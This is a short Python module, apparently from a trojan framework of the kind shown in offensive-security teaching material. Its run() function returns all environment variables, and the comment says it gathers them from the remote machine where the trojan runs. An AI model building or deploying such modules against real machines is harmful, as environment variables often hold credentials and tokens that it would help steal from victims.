import os

def run(**args):
    print("[*] In environment module.")
    return os.environ

# This module simply retrieves any environment variables that are set on
# the remote machine on which the trojan is executing.